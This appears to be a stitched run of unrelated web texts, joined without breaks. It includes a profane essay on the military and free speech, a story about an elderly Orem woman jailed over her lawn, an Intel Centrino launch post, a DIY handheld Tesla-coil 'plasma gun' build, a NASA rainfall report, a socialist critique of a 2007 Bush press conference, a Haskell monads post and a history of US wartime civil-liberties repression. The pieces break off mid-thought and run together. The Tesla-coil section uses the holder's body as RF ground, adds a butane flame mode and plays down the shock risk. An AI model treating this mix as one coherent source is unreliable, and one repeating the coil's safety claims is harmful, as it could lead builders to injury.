I should dearly love to ask Our Leader some pointed questions in this regard : are the War of Northern Aggression dead included in his salutations on this sacred day ?
Why or why not ?
Beyond that , the amount of freedom of speech subsequently granted to former slaves and their descendants has been unquestionably greater in theory than in practice .
But let 's be charitable : GRADE : B+ WWI : The Espionage Act. Needed because the Kaiser was a -coming .
I do n't think so .
GRADE : F. WWII : The Good War. Nazi domination of the American Heartland would have sucked .
But it was never likely .
This may sound harsh , and is not remotely an argument against the Righteousness of the cause , but if the US had stayed out of WWII it would not have materially diminished the amount of freedom of speech enjoyed by Americans .
On the other hand I liked Band of Brothers because it had the Office Space dude in it .
GRADE : B KOREA : What the fuck did this have to do with the capacity of Americans to speak their minds ?
GRADE : N/A VIETNAM : See Korea , only much more of a fuckup .
GRADE : N / A
Not a great transcript .
The best that can be said for the role of the American military in protecting American freedom of speech is that it exists and is big enough to deter any malevolent foreigners from invading us and depriving us of our God - given right to beat off to hot & cold - running digital porn .
The military does not need to be as large as it is to accomplish this , though , and certainly if " preserve American freedom of speech " were the genuine as opposed to the rhetorical mission of the armed services , soldiers and sailors would nowadays face a wholly negligible risk of getting their tits blown off .
So , no , neither I nor anyone else owes anything significant to any member of the US armed forces when it comes to my exercise of free speech -- not historically , and not in the present .
The simple fact of the matter is that the US is not at any genuine risk of invasion by a foreign enemy .
To the extent that we have foreign enemies nowadays , they are pretty pissant next to the Soviet Union .
And while the military surely has a role in dealing with the threat posed by stateless terrorists , that role is wildly overstated and misunderstood .
Nuclear weapons largely made large standing armies obsolete : that 's why the Cold War was cold .
Such armies are still obsolete .
It 's no knock on the soldiers in Iraq now to say that they are being asked to do something they were never trained for , could n't possibly have been trained for ( you ! the 19 year old from North Carolina !
Go be a cop in Fallujah ! WTF ? ) and cannot possibly accomplish .
Humpty - Dumpty , you know .
They 're a 19th century tool in a 21st century global political context .
" Stupid " does not begin to cover it .
But back to the point .
The cold truth is that not a single one of the Americans who have fought and died in Iraq have done anything at all to protect the " freedoms " of a single American citizen .
And the colder truth is that without a profound rethinking of the whole point of the American military in this new century , it will be far less a guarantor of our democracy than a permanent temptation available to those inclined to seize it for illiberal ends .

Sam Penrod ReportingA widow and grandma spent the morning in jail , arrested for refusing to give a policeman her name when he tried writing her a ticket for failing to water her yard .
The woman has n't watered her lawn in more than a year , and the condition of her yard violates an Orem zoning ordinance .
Tonight , the woman says she is traumatized and shocked that she was hauled to jail , just because she says she can't afford to water her lawn .
Betty Perry says , " I never thought they would ever do anything like that to a person that is 70 years old .
I 've never bothered anybody , I 've never hurt anybody . "
She says the policeman who brought her home tonight was very courteous , even held open the door for her .
But there were no gentlemen there when she was taken from her home this morning and booked into jail .
When Betty Perry heard a knock at her door and saw a police officer standing outside , she never imagined she would end up in jail .
That 's what happened , though , when the officer tried enforcing Orem 's nuisance ordinance against neglected yards .
" I did n't want to tell him anything until I talked to a lawyer or my son .
I wanted to see what he'd tell me to do .
I 've never had any experience before with the law , ever in my life , " she said .
As the enforcement officer started writing her a ticket , she tried going back in her house .
That 's when the officer tried to handcuff her for refusing to give her name and resisting the ticket .
She tripped on the steps , scraping up her nose and elbows , leaving blood on her door , her porch and her clothes .
Perry was handcuffed , fingerprinted and put in a jail cell , where she sat for more than an hour .
" I laid down in there .
I never seen the inside of a jail before .
I did n't know how it looked , I was really scared , " she says .
When police brass learned what happened , she was immediately released .
Orem police spokesman Lt. Doug Edwards said , " Every officer in his career has situations they find themselves getting into , at the end of it they scratch their head and say , ‘ gosh , how did this happen ? '
Today , I think , was one of those days .
Clearly there were some other options available . "
After being arrested , Perry is now scared of the police .
She says , " Do n't ever say no when the police tell you do to something .
You better do what they tell you no matter what , even if you do n't have anybody to help you .
You 've got to do what they tell you or they will hurt you . "
The officer was sent home for the day and placed on paid administrative leave .
Police are not pressing any charges against Betty Perry for either neglecting her yard or resisting the ticket .

Santa Rosa Is Out !
Whoopee !!!!!
Intel has just launched the long - awaited Santa Rosa mobile platform !
Ever since the Core 2 Duo mobile processor ( codenamed Merom ) was launched , we have been eagerly waiting for the accompanying Santa Rosa platform to debut .
As impressive as the Core 2 Duo mobile processor was , it felt incomplete without a new platform to support it .
Well , that wait is over for Intel today launched two new Santa Rosa platforms - the Centrino Duo and the Centrino Pro platforms .
Some vendors are already shipping their new Santa Rosa - based notebooks while others will have their notebooks out in the market by first week of June , 2007 .
So , this is not a shadow launch .
Santa Rosa really is HERE !
Let 's take a look and see what different and exciting about these two new mobile platforms .
Centrino Duo
The new Santa Rosa mainstream mobile platform will continue to use the Intel Centrino Duo brand name , replacing the Napa platform which was released in 2006 .
So , there will be some confusion as to which notebook has the latest Santa Rosa technology and which is still based on the older Napa platform .
Good luck trying to get the correct information from your local retailers .
Some still cannot explain the difference between a platform brand ( e.g. Centrino ) and a processor ( e.g. Core 2 Duo ) .
Perhaps that 's the effect Intel marketing is looking for .
Why bother about such details ?
All you need to know is that it's an Intel Centrino notebook and that 's what you should buy !
For those who are more fussy about they buy , the new Centrino Duo platform is based on a new Mobile Intel 965 Express Chipset and new Core 2 Duo models to pair with .
The new chipset has new features like support for a 800M Hz front side bus ( FSB ) , a better graphics core and optional support for new wireless - N connectivity and Intel Turbo Memory .
Centrino Pro
The second mobile platform , dubbed Centrino Pro , is targeted at businesses .
It 's essentially the new Centrino Duo platform with an extra Intel Active Management chip .
What this chip does is allow remote management and enhanced security features , even without an operating system .
Although it has many cool features , most of them would really apply to large organizations that need to centrally manage their IT resources to reduce downtime and improve productivity .
Duo Versus Pro
Do note that Centrino Duo and Centrino Pro are really nothing more than Intel brand names .
For notebooks to qualify for Centrino Duo or Centrino Pro branding ( and associated marketing benefits ) , they have to include certain Intel components .
Let 's take a look at what 's necessary to qualify for the Centrino Duo and Centrino Pro branding and what 's optional .
Intel Centrino Duo Intel Centrino Pro Required • Intel Core 2 Duo processor
• Mobile Intel 965 Express Chipset
• Intel Wireless WiFi Link 4965 AG module
( if 4965 AGN is not selected )
• Intel 82566 MM Gigabit Network connection • Intel Core 2 Duo processor
• Mobile Intel 965 Express Chipset
• Intel Wireless WiFi Link 4965 AG module
( if 4965 AGN is not selected )
• Intel 82566 MM
Gigabit Network connection
• Intel Active Management Technology Optional • Intel Wireless WiFi Link 4965AGN module
• Intel Turbo Memory module • Intel Wireless WiFi Link 4965AGN module
• Intel Turbo Memory module
To qualify for either Centrino brand name , the notebook must have everything in the Required list .
The only exception is the WiFi module .
The notebook manufacturer can opt between the cheaper 4965 AG module and the newer 4965AGN module .

The device draws about 6 amps from a well charged 12 V battery which makes the total power consumption to around 72 watts .
Unfortunately this low power means the plasma arcs will be limited in size , but since it is hand held that ’s probably a good thing .
The typical length of the output arcs is between 5 and 7cm
The high frequency , high voltage from the plasma gun causes the Argon gas in the light bulb to become ionized .
This creates streamers that are attracted to the fingers holding it .
This video clip shows the plasma gun causing a nearby light bulb to light up as if it were a plasma globe .
The device is packed into the casing of cheapo cordless drill from a DIY store .
This drill used an 18V battery and comes with a charger which made it ideal for the project .
The ignition coil driver circuit used takes a direct 12V – 30 V input which is connected using the original switch from the drill .
The design for this Tesla Coil is based on the larger battery powered DIY Tesla Coil project but with the aim of getting a much smaller and portable device .
A Power Pulse Modulator circuit is used to drive two small high voltage ignition coils wired together in an ‘ anti- parralel ’ configuration .
The output is rectified and used to charge the tank capacitor of a small spark gap Tesla Coil .
Such a small Tesla Coil inherently has quite a high resonant frequency which in this case is about 500 kHz .
This frequency is too high to feel as electric shock but when being zapped you can feel the low frequency component of the spark gap firing rate .
The main driving circuit is a type of pulse width modulation circuit with protection against high voltage spikes .
It is adjusted to get the maximum output from the two ignition coils .
The two ignition coils were stripped of the casing in order to reduce the overall size and allow access to the internal wiring .
The inputs are wired in an anti-parallel arrangement to help keep the charging voltage high when under load .
The HV outputs of the spark coils are connected to a rectifier ( D1 ) made from four HV diodes potted in epoxy resin .
Connected to this is a small smoothing capacitor ( C1 ) which helps to reduce the ripple in the HV DC output .
The tank capacitor ( C2 ) is charged from the HV DC supply via two RF chokes ( inductors L1 & L2 ) which serve to prevent the RF oscillations of the TC primary circuit from interfering with the rest of the circuit .
The previous battery powered tesla coil design needed to be well connected to a good RF ground such as a metal rod in the earth .
Without this the output would be limited and the driver circuit would be prone to failure .
With this mini tesla coil the RF ground connection is made by connecting it to a copper pad on the handle .
The body of the person holding the device is used as the RF ground and the large area of copper ensures the energy is spread out to prevent RF burns .
In most Tesla Coils this would not be safe at all but this device is very low power so there is little risk of electric shock .
The RF its self probably is n’t too healthy though !
The TC part ( Tesla Coil ) uses the common single static spark gap and flat primary design for simplicity and size .
The primary coil is closely wound around the base of the secondary with several layers of insulation tape preventing flashover .
The topload sphere is made from a metal draw handle which has been drilled to allow gas to be ejected from the end .
A pipe from this sphere runs down the inside of the secondary and to the back of the handle where it can be connected to a gas supply .
Using noble gasses such as Argon or Neon will cause the output arcs to be forced along the flow of gas .
This allows the plasma to be directed in a straight line from the tip of the plasma gun .
It is also possible to use butane gas which makes this thing into some kind of flamethrower – plasma gun hybrid .
The electricity is conducted along the flame from its tip .
You can see photos of this effect on our plasma page .
Apart from making cool arcs of plasma , this device even transmits wireless electrical power .
It can light bulbs and fluorescent lights just from being nearby .
The interference created by this wireless energy can cause all sorts of electronic devices to switch on and off or start behaving erratically .
This is because the energy is causing tiny currents to be induced in the tracks and wires in the devices .
If a simple circuit had a matching resonant frequency to that of the plasma gun , it would be possible to collect the wireless energy from a greater distance .
There are several improvements that could be made on this design which could result in a greater power throughput and therefore bigger arcs .
The spark gap is just a single gap which has been seal inside a plastic case for safety and size .
This sort of switching will have poor performance due to quenching difficulties and oxide buildup .
A solid state version would be better but it would likely be larger and considerably more expensive .
A larger topload would allow for larger breakouts , but it would also need more primary capacitance .
The secondary coil is also rather long relative to its width .
Ideally this would be shorter and wider .
In conclusion this was a fun project and we hope you find this information useful and interesting .
NASA scientists have detected the first signs that tropical rainfall is on the rise with the longest and most complete data record available .
Using a 27 - year - long global record of rainfall assembled by the international scientific community from satellite and ground - based instruments , the scientists found that the rainiest years in the tropics between 1979 and 2005 were mainly since 2001 .
The rainiest year was 2005 , followed by 2004 , 1998 , 2003 and 2002 , respectively .
" When we look at the whole planet over almost three decades , the total amount of rain falling has changed very little .
But in the tropics , where nearly two - thirds of all rain falls , there has been an increase of 5 percent , " says lead author Guojun Gu , a research scientist at Goddard Space Flight Center in Greenbelt , Md . The rainfall increase was concentrated over tropical oceans , with a slight decline over land .
Climate scientists predict that a warming trend in Earth 's atmosphere and surface temperatures would produce an accelerated recycling of water between land , sea and air .
Warmer temperatures increase the evaporation of water from the ocean and land and allow air to hold more moisture .
Eventually , clouds form that produce rain and snow .
" A warming climate is the most plausible cause of this observed trend in tropical rainfall , " says co-author Robert F. Adler , senior scientist at Goddard 's Laboratory for Atmospheres .
Adler and Gu are now working on a detailed study of the relationship between surface temperatures and rainfall patterns to further investigate the possible link .
Obtaining a global view of our planet 's rainfall patterns is a challenging work - in - progress .
Only since the satellite era have regular estimates of rainfall over oceans been available to supplement the long - term but land - limited record from rain gauges .
Just recently have the many land - and space - based data been merged into a single global record endorsed by the international scientific community : the Global Precipitation Climatology Project , sponsored by the World Climate Research Program .
Adler 's research group at NASA produces the project 's monthly rainfall updates , which are available to scientists worldwide .
Using this global record , Gu , Adler and their colleagues identified a small upward trend in overall tropical rainfall since 1979 , but their confidence was not high that this was an actual long - term trend rather than natural year - to - year variability .
So they took another look at the record and removed the effects of the two major natural phenomena that change rainfall : the El Niño -- Southern Oscillation and large volcanic eruptions .

El Niño is a cyclical warming of the ocean waters in the central and eastern tropical Pacific that generally occurs every three to seven years and alters weather patterns worldwide .
Volcanoes that loft debris into the upper troposphere and stratosphere create globe - circling bands of aerosol particles that slow the formation of precipitation by increasing the number of small cloud drops and temporarily shielding the planet from sunlight , which lowers surface temperatures and evaporation that fuels rainfall .
Two such eruptions -- El Chicon in Mexico and Mount Pinatubo in the Philippines -- occurred during the 27 - year period .
The scientists found that during El Niño years , total tropical rainfall did not change significantly but more rain fell over oceans than usual .
The two major volcanoes both reduced overall tropical rainfall by about 5 percent during the two years following each eruption .
With these effects removed from the rainfall record , the long - term trend appears more clearly in both the rainfall data over land and over the ocean .
According to Adler , evidence for the rainfall trend is holding as more data come in .
The latest numbers for 2006 show another record - high year for tropical rainfall , tying 2005 as the rainiest year during the period .
" The next step toward firmly establishing this initial indication of a long - term tropical rainfall trend is to continue to lengthen and improve our data record , " says Adler , who is project scientist of the Tropical Rainfall Measuring Mission ( TRMM ) , a joint mission between NASA and the Japan Aerospace Exploration Agency .
The three primary instruments on TRMM are currently providing the most detailed view of rainfall ever provided from space .
Adler 's group has been incorporating TRMM rainfall data since 1997 into the global rainfall record .
NASA plans to extend TRMM 's success of monitoring rainfall over the tropics to the entire globe with the Global Precipitation Measurement mission , scheduled for launch in 2013 .
This international project will provide measurements of both rain and snow around the world with instruments on a constellation of spacecraft flying in different orbits .
The study appears in the Aug. 1 , 2007 , issue of the American Meteorological Society 's Journal of Climate .
White House press conference
Bush rejects any US military pullback in Iraq
By Patrick Martin
13 July 2007
The Thursday morning press conference by President Bush demonstrated the unbridgeable gulf between the Washington political and media elite , who reflect the interests of the US financial aristocracy , and the vast majority of working people , who are increasingly opposed to the war in Iraq and the administration that perpetrated it .
Even by the standards of a Bush press conference , the president ’s performance was remarkable for its preposterous and lying distortion of the reality in Iraq .
His opening statement presented a picture of conditions in that devastated country that would find few supporters even among Republicans in Congress .
The press conference , held only minutes after the official release of a new administration assessment of “ progress ” in the war , was an effort to shape media accounts of that report , characterizing it as a “ mixed ” and interim verdict from which no sweeping conclusions could be drawn .
The report , however , despite its deliberately vague language , effectively concedes that the US - imposed regime in Baghdad has proven incapable of carrying out the commands of its masters in Washington , failing to end to sectarian bloodshed , achieve a settlement on the country ’s political structure , or enact an oil law to give American companies access to Iraqi energy resources .
The statement that was perhaps most at odds with reality in Bush ’s opening remarks was this :
“ The real debate over Iraq is between those who think the fight is lost or not worth the cost and those who believe the fight can be won , and that , as difficult as the fight is , the costs of defeat would be far higher . ”
This is a distorted characterization of the divisions in official Washington between the Bush administration and congressional Democrats , which involves increasing numbers of congressional Republicans switching sides as well .
Among the big business politicians and media pundits , there is a shared desire for “ success ” in Iraq , defined as maintaining US control over the country ’s vast oil resources and maintaining US domination of the wider Middle East .
More and more of the political representatives of the corporate ruling elite have concluded , however , that the war is a failure , and that US troops must be redeployed — not withdrawn — in order to salvage what can be saved from the wreckage of Bush ’s policies .
Among the American people , however , the surge in antiwar sentiment has a much different meaning .
The mass opposition is not , as Bush repeatedly asserts , simply a matter of skepticism over the prospects for winning the war , but rather a deep - going moral and political revulsion at the criminality of the war and of those who conspired to carry it out .
The war was launched on the basis of lies .
Despite all the efforts of the media and the political elite to gloss it over , that fact has enormous and enduring consequences .
The majority of the American people , according to opinion polls , believe that Bush , Cheney & Co. deliberately lied to make their case for war — lies that were exposed when the conquest of Iraq provided no evidence of weapons of mass destruction or ties between Saddam Hussein and Al Qaeda .
Bush returned to this issue later in the press conference when questioned about the mounting public opposition to the war .
“ I understand why the American people are — you know — they ’re tired of the war , ” he said .
“ People are — there ’s war fatigue in America .
It ’s affecting our psychology .
I ’ve said this before .
I understand that .
This is an ugly war .
It ’s a war in which an enemy will kill innocent men , women and children in order to achieve a political objective .
It does n’t surprise me that there is deep concern amongst our people .
Part of that concern is whether or not we can win , whether or not the objective is achievable .
People do n’t want our troops in harm ’s way if that which we ’re trying to achieve ca n’t be accomplished . ”
It is worth the effort to disentangle this mass of falsehoods , distortions and half truths .
Bush suggests that opposition to the war is based entirely on exhaustion — “ war fatigue , ” as he put it .
In other words , he is suggesting that his aims in launching and prosecuting the war are widely accepted and popular , and that opposition reflects only the difficulty of the struggle and the meagerness of the results .
But tens of millions of American working people increasingly recognize the war not as a case of poor judgment or incompetent management but as a historic crime .
Bush refers to the war as ugly , as “ a war in which an enemy will kill innocent men , women and children in order to achieve a political objective . ”
There are millions of Americans who believe , quite rightly , that those words are an exact description of the methods of the Bush - Cheney regime , which is responsible for launching a war that has resulted in the deaths of hundreds of thousands of “ innocent men , women and children ” in order to achieve its “ political objective ” : American domination of the center of world oil production .
There is an ominous and profoundly undemocratic logic to Bush ’s language about war weariness .
He is essentially suggesting that the American people are weakening under the toll of attacks by Al Qaeda terrorists , and that it is his job , as president , to provide the strength and determination that they lack .
The implication — not yet openly drawn but obvious — is that the president must defy the will of the American people , and perhaps even prevent them from expressing their “ war fatigue , ” in pursuit of victory in the “ war on terror . ”
This anti-democratic trajectory was also revealed in Bush ’s discussion of congressional efforts to put restrictions on the conduct of the war , such as the series of amendments to the defense authorization bill now being debated and voted on in the Senate and House of Representatives .
One reporter asked him about his role as commander - in - chief .
“ Have you entertained the idea that at some point Congress may take some of that sole decision - making power away through legislation ? ”
Bush responded by essentially ruling out any congressional role in war policy other than as a financial rubberstamp .
“ I do n’t think Congress ought to be running the war , ” he said .
“ I think they ought to be funding our troops . ”
He continued , “ I ’ll work with Congress .
I listen to Congress .
Congress has got all the right to appropriate money .
But the idea of telling our military how to conduct operations , for example , or how to , you know , deal with troop strength , is — I do n’t think it makes sense . ”
This conception turns the US constitutional structure upside down , making the president an elected dictator whose only obligation , in waging a war now in its fifth year , is to “ consult ” with the legislature , which has no power to decide anything , and must provide funding for the war as directed by the chief executive .
As a political event , the main purpose of the press conference was to appeal to congressional Republicans not to lend their support to any of the various Senate and House measures that would restrict the conduct of the war , although all the measures backed by the Democratic leadership leave final decision - making in the hands of the president , who can waive limits on troop levels and missions simply by declaring it to be in the interests of “ national security . ”
Bush repeatedly invoked the name of General David Petraeus , the overall commander in Iraq , whose appointment was approved unanimously by the Democratic - controlled Congress early this year .
Petraeus is to report by September 15 on Iraqi progress on meeting the 18 benchmarks laid down in the emergency funding bill enacted by Congress in May .
But Bush made clear that the decision on continuing the war indefinitely had already been made .
Once again falsely claiming that the war in Iraq was a necessary response to the terrorist attacks of September 11 , 2001 , Bush claimed , “ The same folks that are bombing innocent people in Iraq were the ones who attacked us in America on September the 11 , and that ’s why what happens in Iraq matters to security here at home . ”
One reporter challenged him on this claim , asking , “ On that point , what evidence can you present to the American people that the people who attacked the United States on September 11th are , in fact , the same people who are responsible for the bombings taking place in Iraq ? ”
Bush evaded the issue , pointing to the links between Al Qaeda in Iraq and the Al Qaeda organization of Osama bin Laden , without addressing the fact that the vast majority of the violence in Iraq has nothing to do with Al Qaeda .
It is a combination of sectarian civil war between Shiite and Sunni elements and attacks by all factions of Iraqis on the American forces , motivated by nationalist hostility to the occupation of their country .
He said that the war would be continued by his successor after January 20 , 2009 , a statement that is undoubtedly true , given that every major Democratic and Republican presidential candidate is committed to the continued US military occupation of Iraq .
Bush reiterated the warnings of apocalyptic consequences of a US defeat in Iraq that have become a staple of the official discussion of the war .
Some of those consequences — “ mass killings on a horrific scale ” in Iraq , for instance — are already taking place , and are caused by the US occupation regime .
He also returned again to the question of popular opposition to the war , and his determination not to concede an inch to it .
He derided all concern with public opinion as “ running a focus group . ”
Most significantly , he cited the resistance of the military itself to any popular check on war policy .
“ I ’m pretty confident our military do not want their commander in chief making political decisions about their future , ” he said .
The threat here is transparent : Bush was telling his Democratic ( and Republican ) critics that the military would not tolerate congressional interference with the war .
And he was suggesting that he might well defy any congressional restriction on the war and rely on the military for support .
I ’ve been following Adam Turoff ’s excellent Haskell tutorial and he ’s just reached the part where he explains Monads .
To listen to a lot of people , Monads are the bit of Haskell that breaks their brains .
As they ’re usually described , Monads are the part of Haskell that allow you to write code that has side effects .
You know , stuff like reading a file or generating a random number .
What most of the tutorials I ’ve read do n’t do is explain why Monads let you use side effects .
Or , to put it another way , why you ca n’t successfully use side effects in Haskell without them .
Monads wrap up the concept of a sequence of actions in something that looks , from outside the Monad , like an other datatype .
It clicked for me when I remembered something from a course on Set Theory when I was an undergraduate mathematician .
The thing about sets is , they ’re not ordered .
{a , b} is the same set as {b , a} .
However , when you ’re busily constructing all the entities that get used in mathematics from the Zermelo / Fraenkel axioms , you eventually need to build ordered pairs of numbers .
Coordinate systems for example , make heavy use of ordered pairs .
So , if you ’ve got sets , which are not ordered , and you need to build a set which can be interpreted as an ordered pair , how do you proceed ?
The standard method is to represent the ordered pair , ( x , y ) as { {x} , {x , y} } .
Look at the Wikipedia article if you want the gory details .
So , an ordered pair is just a handy notation for a slightly more complicated , unordered , set .
Monads are a generalization of this principle ; in a sense , the details of how they work are irrelevant ( in the same way that the innards of an ordered pair are irrelevant ) , what ’s important is that they provide a box in which ordered execution can happen .
And ordered execution is what you need if you want to write code that uses side effects or works with impure ‘ functions ’ that do n’t always return the same value given the same input .
Monads can seem so mindbending because most of us come from a programming background where ordered execution is all there is .
In pretty much every mainstream language , the idea that the programmer does n’t control the order in which code is evaluated seems utterly outlandish .
Monads look weird , then , because we ’ve never thought of the problem they solve as a problem in the first place .
It ’s just how programs are .
Maybe it ’s time we tried to let go of that assumption .
Or maybe I ’ve completely misunderstood monads .
It ’s probably the latter .
Someone commenting on this post at reddit.com points out that monads are n’t solely used for wrapping sequential processing ; they can be used to wrap pretty much every model of computation you could come up with .
Which , I must admit , had n’t quite clicked with me , despite realising that Parsec , a Haskell parser combinator library , was monadic but was n’t really about sequential processing because the Parser monad also handled backtracking .
So , it seems that I ’ve incompletely misunderstood monads .
Not Just Japanese Americans : The Untold Story of U.S. Repression During ' The Good War '
Jeffrey Rogers Hummel
I. Pre-Pearl Harbor
The sad saga of civil liberties in the United States during the Second World War begins well before Pearl Harbor .
The popular impression is that the Japanese surprise attack in December 1941 caught the U.S. government totally unaware .
In an effort to counter this impression , countless revisionist historians have raked over the diplomatic events that proceeded the attack .
/1
Yet , prior domestic developments within the U.S. probably belie the impression of U.S. unpreparedness much more forcefully .
For the U.S. government was , without a doubt , better prepared to fight World War II than any previous war in its history .
This unprecedented military preparedness resulted from a massive prewar mobilization that involved , first , the U.S. 's first large peacetime foreign aid program : lend - lease ; second , an emergency peacetime military buildup ; third , the first peacetime draft in U.S. history to support that buildup ; fourth , an array of new and heavy emergency taxes to pay for the buildup ; fifth , the creation of a new and broad regulatory bureaucracy , supplementing New Deal agencies , to direct the economy toward war production ; sixth , the use of troops to enforce labor settlements within critical defense industries ; and finally seventh , the adoption of a peacetime sedition law to suppress disloyalty .
/ 2
This last is what concerns us .
The pre-Pearl Harbor sedition law , the Smith Act , is more generally known for its postwar enforcement , in a period of tense U.S. relations with the Soviet Union .
In fact , it was just the most glaring manifestation of the growing precariousness of civil liberties as the nation went on a war footing prior to its intervention in World War II .
The deteriorating international situation brought a rash of related legislation , Congressional inquiries , executive harassment , and state government repression , all aimed at so - called subversive activities .
/ 3
Because of disillusionment with the First World War , Americans initially wished to stay out of the Second .
An early generation of revisionist historians had successfully debunked the official justifications for U.S. participation in World War I , and had overturned the judgment of exclusive German war guilt .
In 1934 and 1935 , a Senate committee , under the chairmanship of Gerald P. Nye , a progressive Republican , investigated the munitions industry .
It concluded that American financiers and arms merchants had maneuvered the U.S. into the previous European conflict for their own profit .
All of these trends coalesced into a powerful isolationist movement , opposed to any future U.S. involvement in European quarrels .
The debate between the isolationists and interventionists became intense and bitter with the onset of war in Europe .
By 1940 , a broad - based coalition of noninterventionists had joined together in the America First Committee .
Among the committee 's luminaries , supporters , and sympathizers were Colonel Charles A. Lindbergh , the aviator hero of the twenties ; General Robert E. Wood , chairman of the board of Sears , Roebuck ; Colonel Robert R. McCormick , publisher of the conservative Chicago Tribune ; ex-President Herbert Hoover , labor leader John L. Lewis , who had co-founded the militant Congress of Industrial Organizations as a rival to the American Federation of Labor , Norman Thomas , Socialist Party candidate for President ; and progressive Democratic Senator Burton K. Wheeler from Montana . /4
Although the isolationists were influential enough to prevent President Franklin D. Roosevelt from dragging the nation overtly into the war before Pearl Harbor , they were unable to prevent the prewar mobilization .
Eventually their loyalty came under question , and the government subjected them to increasing harassment .
But before that transpired , the State had already honed its repressive instruments upon much less prominent targets on the extreme Right and extreme Left .
Numerous American fascist groups , nearly an minuscule , had sprouted in the Great Depression 's fertile soil .
The two most vocal were the German - American Bund and the Legion of Silver Shirts .
Both groups were violently anti-Jewish , with paramilitary trappings , and both received public attention grotesquely out of proportion to their numbers .
The German - American Bund , virulently but not officially a U.S. branch of Germany 's National Socialist Party , drew its fewer than 25,000 and probably closer to 8,500 members from among recent German immigrants .
At its peak , the Bund packed Madison Square Garden in New York with 22,000 sympathizers for a George Washington 's birthday rally in 1939 .
The Silver Shirts was an independent organization , headed by mystic William Dudley Pelley .
Its membership may have reached 15,000 in 1934 , but thereafter it declined to less than 5,000 .
None of the native fascist organizations , separately or in combination , ever approached the influence of the Ku Klux Klan in the twenties .
/ 5
The U.S. Communist Party had likewise experienced a surge during the depression decade , growing from 7,500 in 1930 to 30,000 in 1935 .
By the mid-thirties , the party had adopted the strategy of joining thousands of non-communists in popular front organizations , such as the American League for Peace and Democracy .
Many party members found employment in the burgeoning bureaus of the New Deal .
With the signing of the German - Soviet nonaggression pact in August 1939 , the Communist Party also indirectly arrived at an isolationist foreign policy stance .
/6
Very early in the depression the House 's Fish Committee had briefly looked into Communist propaganda .
With this one lone exception , the precedent established during the post - World War I Red Scare of Congressional investigation into subversive activity had lain dormant until the German Reichstag granted absolute power to Adolf Hitler in March 1933 , the same month as F.D.R.'s inauguration .
Immediately , the internal threat to this country from the right received equal billing with the internal threat from the left , in what one historian has recently dubbed the " Brown Scare . "
The House established a new special committee to investigate these twin " foreign " dangers , with John W. McCormack as chairman and Samuel Dickstein as vice - chairman .
The committee released a report in 1935 that branded the Communist Party , the Silver Shirts , and several other organizations as subversive .
The ultimate results of the committee 's efforts was enactment in 1938 , while events were reaching the boiling point in Europe , of the Foreign Agents Registration Act .
This first of the pre-World War II repressive laws provided a maximum penalty of two years and $ 1000 ( later increased to five years and $ 10,000 ) for anyone whom the U.S. government deemed a " foreign agent " but who failed to register as such with the Secretary of State .
At the time that the Foreign Agents Registration Act passed , the most significant loyalty legislation already on the books was the World War I Espionage Act .
The Espionage Act had combined three features : first , a true espionage law , which punished spying and wartime sabotage , second , a neutrality law , which restricted the non-neutral acts of private citizens in foreign conflicts , and third , a sedition law , providing up to twenty years in jail and a $ 10,000 fine for aiding the enemy with " false reports or false statements , " for obstructing recruiting , or for causing insubordination , disloyalty , or mutiny in the U.S. armed forces .
The act also empowered the Postmaster General to exclude from the mail issues of newspapers and periodicals that he felt were subversive .
The sedition portions of the Espionage Act , however , were inoperative in peacetime .
During the infamous Red Scare , the Wilson Administration had sought a peacetime sedition act , but had failed .
The Foreign Agents Registration
Act represented a minor step toward closing that loophole .
Congress also implemented a second of the McCormack - Dickstein Committee 's recommendations : an extension of the Congressional subpoena power beyond the District of Columbia A new Special House Committee to Investigate Un- American Activities , created in 1938 with Martin Dies of Texas as chairman , put this added power to effective use .
Like its predecessor , the Dies Committee went after both domestic fascists and Communists .
It paid greater attention to the latter , however , as Dies , an arch - foe of the New Deal , attempted to taint the Roosevelt Administration with Communist associations .
Each succeeding
House faithfully renewed the committee , and several states copied it , with their own " little Dies " committees .
/ 7
While the Dies Committee 's spectacular hearings and voluminous reports gathered headlines , Congress approved an array of additional security laws : the Hatch Act of 1939 , which generally restricted the political freedom of government employees and specifically prohibited Communists from working for the national government ; an amendment of March 1940 to the Espionage Act , increasing the act 's penalties for spying , neutrality violations , and other infractions that applied during peacetime ; and finally the Smith Act of June 1940 .
The Smith Act bore the somewhat misleading official title of Alien Registration Act .
To be sure , provisions of the act affected the 3.5 million immigrants in this country who had not attained citizenship .
It required their registration and fingerprinting , and it made deportation for revolutionary activities and beliefs easier .
Several states had already foreshadowed these moves .
With the outbreak of war in Europe , Georgia and Pennsylvania had both required aliens to register , and Pennsylvania had also forbidden them to hunt , fish , or own dogs .
The Smith Act 's most far - reaching provisions , however , established a penalty of up to ten years in jail and a $ 10,000 fine for encouraging insubordination in the military , for advocating , in speech or writing , the forceful overthrow of the U.S. government , or for joining any organization that so advocated .
Thus , the Smith Act was , in fact , a true peacetime sedition law of the same sort that had previously failed to pass at the height of the Red Scare .
It took the approach of World War II to secure enactment .
Following the Smith Act , Congress added still more " security " legislation .
The Selective Service Act of September 1940 , which gave the U.S. its first peacetime draft , also carried penalties for urging resistance to the draft .
The Nationality Act of October 1940 facilitated divesting naturalized immigrants of their citizenship for radical political beliefs .
The Voorhis Act , passed later the same month , required registration with the Attorney General of all organizations subject to " foreign control , " if involved in civilian - military activities or if advocating the overthrow of the government .
( the previous Foreign Agents Registration Act applied to individuals . )
The fact that the Voorhis Act could require members of the radical organizations to incriminate themselves under the Smith Act did not faze Congress .
Just before the Pearl Harbor attack , another amendment to the Espionage Act made sabotage a national crime during peacetime as well as wartime .
In short , the pre-Pearl Harbor period witnessed the most sustained outburst of repressive legislation in the nation 's history .

Executive - branch harassment of government opponents kept pace with Congress 's steady prewar infringement of people 's political liberty .
At the van of this harassment was the national government 's police force : the Federal Bureau of Investigation ( FBI ) .
To fully appreciate the FBI 's prewar politicization , we must take a brief retrospective look at that agency 's evolution during the interwar years .
/9
In the midst of the Red Scare , Attorney General A. Mitchell Palmer had established within what was then called the Bureau of Investigation ( it got its current name in 1935 ) a special section to investigate radicals : the General Intelligence Division , with the young J. Edgar Hoover at its head .
The Bureau 's subsequent raids and deportations had left it , however , with a severely tarnished reputation .
As a result of further revelations that the Bureau had even spied upon Congressmen in order to suppress the Teapot Dome scandal , the supposedly reactionary Coolidge Administration ordered an abrupt halt to all the Bureau 's political activities and abolished the General Intelligence Division .
Unfortunately , to clean up the Bureau , the Coolidge Administration made none other than J. Edgar Hoover its new director .
Defenders of Hoover cite this as proof that his role in the Red Scare had been merely perfunctory .
